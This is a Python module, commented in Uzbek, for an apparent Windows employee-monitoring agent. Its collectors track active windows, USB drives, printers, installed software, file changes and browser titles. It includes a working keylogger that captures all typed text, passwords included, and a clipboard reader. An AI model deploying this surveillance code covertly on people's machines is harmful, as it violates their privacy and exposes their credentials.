"""Windows'ga xos kolektorlar. Faqat Windows'da import qilinadi.

Bosqich 1: faol oyna (+ davomiylik), klaviatura, USB disk, printer, o'rnatilgan dastur.
Keyingi bosqichlarda: clipboard, fayl monitoringi, veb, e-mail, telegram va h.k.
"""
import logging
import string
import threading
import time

from .base import Collector, now_iso

log = logging.getLogger("agent.windows")


def _foreground():
    """Joriy faol oyna uchun (app_nomi, sarlavha) qaytaradi."""
    try:
        import win32gui
        import win32process
        import psutil
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        app = ""
        try:
            app = psutil.Process(pid).name()
        except Exception:  # noqa: BLE001
            pass
        return app, title
    except Exception as e:  # noqa: BLE001
        log.debug("foreground o'qilmadi: %s", e)
        return "", ""


class WindowsActiveWindow(Collector):
    """Faol oyna almashganda, tark etilgan oynada sarflangan vaqtni qaytaradi."""
    name = "active_window"

    def __init__(self):
        self._cur = None
        self._since = time.time()

    def poll(self) -> list[dict]:
        app, title = _foreground()
        if not title:
            return []
        key = (app, title)
        if self._cur is None:
            self._cur, self._since = key, time.time()
            return []
        if key == self._cur:
            return []
        prev_app, prev_title = self._cur
        duration = int(time.time() - self._since)
        self._cur, self._since = key, time.time()
        return [{
            "type": "active_window", "severity": "info",
            "app": prev_app, "title": prev_title,
            "occurred_at": now_iso(),
            "details": {"duration_sec": duration},
        }]


class WindowsKeyboard(Collector):
    """Terilgan matnni to'playdi (Backspace va modifikatorlar to'g'ri hisoblanadi).

    pynput tinglovchisi alohida oqimda ishlaydi. poll() da to'plangan matn,
    agar vaqt o'tgan yoki buffer kattalashgan bo'lsa, faol oyna bilan yuboriladi.
    """
    name = "keyboard"

    def __init__(self, flush_sec: int = 5, max_chars: int = 200):
        self.flush_sec = flush_sec
        self.max_chars = max_chars
        self._buf: list[str] = []
        self._lock = threading.Lock()
        self._last_flush = time.time()
        self._start_listener()

    def _start_listener(self):
        try:
            from pynput import keyboard
        except ImportError as e:
            log.error("pynput yo'q — klaviatura ishlamaydi: %s", e)
            return

        def on_press(key):
            try:
                from pynput import keyboard as kb
                with self._lock:
                    if key == kb.Key.space:
                        self._buf.append(" ")
                    elif key == kb.Key.enter:
                        self._buf.append("\n")
                    elif key == kb.Key.backspace:
                        if self._buf:
                            self._buf.pop()
                    elif hasattr(key, "char") and key.char is not None:
                        self._buf.append(key.char)
                    # boshqa maxsus tugmalar (Ctrl, Alt, ...) e'tiborga olinmaydi
            except Exception:  # noqa: BLE001
                pass

        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
        log.info("Klaviatura tinglovchisi ishga tushdi")

    def poll(self) -> list[dict]:
        now = time.time()
        with self._lock:
            size = len(self._buf)
            due = (now - self._last_flush >= self.flush_sec) or (size >= self.max_chars)
            if not self._buf or not due:
                return []
            text = "".join(self._buf).strip()
            self._buf.clear()
            self._last_flush = now
        if not text:
            return []
        app, title = _foreground()
        return [{
            "type": "keyboard", "severity": "info",
            "app": app, "title": title, "text": text,
            "occurred_at": now_iso(), "details": {},
        }]


class WindowsUsb(Collector):
    """Olinadigan (removable) disklarning ulanishi/uzilishini kuzatadi."""
    name = "usb"

    def __init__(self):
        self._known = self._scan()

    def _scan(self) -> dict[str, str]:
        drives: dict[str, str] = {}
        try:
            import win32file
            import win32api
            for letter in string.ascii_uppercase:
                root = f"{letter}:\\"
                try:
                    if win32file.GetDriveType(root) == win32file.DRIVE_REMOVABLE:
                        label = ""
                        try:
                            label = win32api.GetVolumeInformation(root)[0]
                        except Exception:  # noqa: BLE001
                            pass
                        drives[f"{letter}:"] = label or "USB disk"
                except Exception:  # noqa: BLE001
                    continue
        except ImportError as e:
            log.error("win32 yo'q — USB kuzatuvi ishlamaydi: %s", e)
        return drives

    def poll(self) -> list[dict]:
        current = self._scan()
        events: list[dict] = []
        for drive, label in current.items():
            if drive not in self._known:
                events.append({
                    "type": "usb", "channel": "usb", "severity": "warn",
                    "title": f"USB disk ulandi: {drive} ({label})",
                    "occurred_at": now_iso(),
                    "details": {"action": "connected", "drive": drive, "label": label},
                })
        for drive, label in self._known.items():
            if drive not in current:
                events.append({
                    "type": "usb", "channel": "usb", "severity": "info",
                    "title": f"USB disk uzildi: {drive} ({label})",
                    "occurred_at": now_iso(),
                    "details": {"action": "disconnected", "drive": drive, "label": label},
                })
        self._known = current
        return events


class WindowsPrinter(Collector):
    """Printer qo'shilishi/olib tashlanishini kuzatadi.

    Eslatma: chop etilgan hujjat mazmunini olish (spooler monitoringi) keyingi bosqichда.
    """
    name = "printer"

    def __init__(self):
        self._known = self._scan()

    def _scan(self) -> set[str]:
        try:
            import win32print
            flags = win32print.PRINTER_ENUM_LOCAL | win32print.PRINTER_ENUM_CONNECTIONS
            return {p[2] for p in win32print.EnumPrinters(flags)}
        except Exception as e:  # noqa: BLE001
            log.debug("printerlar o'qilmadi: %s", e)
            return set()

    def poll(self) -> list[dict]:
        current = self._scan()
        events: list[dict] = []
        for name in current - self._known:
            events.append({
                "type": "printer", "channel": "print", "severity": "info",
                "title": f"Printer qo'shildi: {name}",
                "occurred_at": now_iso(), "details": {"action": "added", "printer": name},
            })
        for name in self._known - current:
            events.append({
                "type": "printer", "channel": "print", "severity": "info",
                "title": f"Printer olib tashlandi: {name}",
                "occurred_at": now_iso(), "details": {"action": "removed", "printer": name},
            })
        self._known = current
        return events


class WindowsSoftware(Collector):
    """O'rnatilgan dasturlar ro'yxatini registrdan o'qiydi va o'zgarishni (o'rnatish/o'chirish) qaytaradi.

    Birinchi ishga tushishda bazaviy ro'yxat eslab qolinadi, hodisa yuborilmaydi.
    Keyin faqat farqlar yuboriladi.
    """
    name = "software"

    def __init__(self, interval_sec: int = 300):
        self.interval_sec = interval_sec
        self._last_check = 0.0
        self._known = self._scan()  # bazaviy ro'yxat

    def _scan(self) -> dict[str, str]:
        apps: dict[str, str] = {}
        try:
            import winreg
        except ImportError:
            return apps
        roots = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        ]
        for hive, path in roots:
            try:
                key = winreg.OpenKey(hive, path)
            except OSError:
                continue
            for i in range(winreg.QueryInfoKey(key)[0]):
                try:
                    sub = winreg.OpenKey(key, winreg.EnumKey(key, i))
                    name = winreg.QueryValueEx(sub, "DisplayName")[0]
                    try:
                        ver = winreg.QueryValueEx(sub, "DisplayVersion")[0]
                    except OSError:
                        ver = ""
                    apps[name] = ver
                except OSError:
                    continue
        return apps

    def poll(self) -> list[dict]:
        now = time.time()
        if now - self._last_check < self.interval_sec:
            return []
        self._last_check = now
        current = self._scan()
        events: list[dict] = []
        for name, ver in current.items():
            if name not in self._known:
                events.append({
                    "type": "software", "severity": "warn",
                    "title": f"Yangi dastur o'rnatildi: {name} {ver}".strip(),
                    "occurred_at": now_iso(),
                    "details": {"action": "installed", "name": name, "version": ver},
                })
        for name in self._known:
            if name not in current:
                events.append({
                    "type": "software", "severity": "info",
                    "title": f"Dastur o'chirildi: {name}",
                    "occurred_at": now_iso(),
                    "details": {"action": "removed", "name": name},
                })
        self._known = current
        return events


class WindowsClipboard(Collector):
    """Clipboard (nusxa olingan matn) o'zgarishini kuzatadi."""
    name = "clipboard"

    def __init__(self):
        self._last = ""

    def poll(self) -> list[dict]:
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            try:
                data = ""
                if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                    data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT) or ""
            finally:
                win32clipboard.CloseClipboard()
        except Exception as e:  # noqa: BLE001
            log.debug("clipboard o'qilmadi: %s", e)
            return []

        data = (data or "").strip()
        if not data or data == self._last:
            return []
        self._last = data
        app, _ = _foreground()
        return [{
            "type": "clipboard", "channel": "clipboard", "severity": "info",
            "app": app, "text": data[:2000],
            "occurred_at": now_iso(), "details": {},
        }]


class WindowsFileMonitor(Collector):
    """Foydalanuvchi papkalarida (Desktop, Documents, Downloads) fayl o'zgarishini kuzatadi."""
    name = "file_monitor"

    def __init__(self):
        self._buf: list[dict] = []
        self._lock = threading.Lock()
        self._start()

    def _start(self):
        try:
            import os
            from watchdog.observers import Observer
            from watchdog.events import FileSystemEventHandler
        except ImportError as e:
            log.error("watchdog yo'q — fayl monitoringi ishlamaydi: %s", e)
            return

        buf, lock = self._buf, self._lock

        class Handler(FileSystemEventHandler):
            def _add(self, action, path, uz, sev="info"):
                with lock:
                    buf.append({
                        "type": "file_monitor", "channel": "file", "severity": sev,
                        "title": f"Fayl {uz}: {os.path.basename(path)}",
                        "occurred_at": now_iso(),
                        "details": {"action": action, "path": path},
                    })

            def on_created(self, e):
                if not e.is_directory:
                    self._add("created", e.src_path, "yaratildi")

            def on_modified(self, e):
                if not e.is_directory:
                    self._add("modified", e.src_path, "o'zgartirildi")

            def on_deleted(self, e):
                if not e.is_directory:
                    self._add("deleted", e.src_path, "o'chirildi", "warn")

            def on_moved(self, e):
                if not e.is_directory:
                    self._add("moved", e.dest_path, "ko'chirildi", "warn")

        home = os.path.expanduser("~")
        observer = Observer()
        for sub in ("Desktop", "Documents", "Downloads"):
            path = os.path.join(home, sub)
            if os.path.isdir(path):
                observer.schedule(Handler(), path, recursive=True)
        observer.daemon = True
        observer.start()
        log.info("Fayl monitoringi ishga tushdi (Desktop, Documents, Downloads)")

    def poll(self) -> list[dict]:
        with self._lock:
            if not self._buf:
                return []
            out = self._buf[:]
            self._buf.clear()
        return out


_BROWSERS = {"chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe"}


class WindowsWeb(Collector):
    """Brauzer faol oynasidan tashrif buyurilgan sahifani (sarlavha asosida) qayd etadi.

    To'liq URL olish uchun keyingi bosqichda brauzer kengaytmasi/proksi kerak.
    """
    name = "web"

    def __init__(self):
        self._last = None

    def poll(self) -> list[dict]:
        app, title = _foreground()
        if app.lower() not in _BROWSERS or not title:
            return []
        if title == self._last:
            return []
        self._last = title
        return [{
            "type": "web", "channel": "web", "severity": "info",
            "app": app, "title": title,
            "occurred_at": now_iso(), "details": {},
        }]
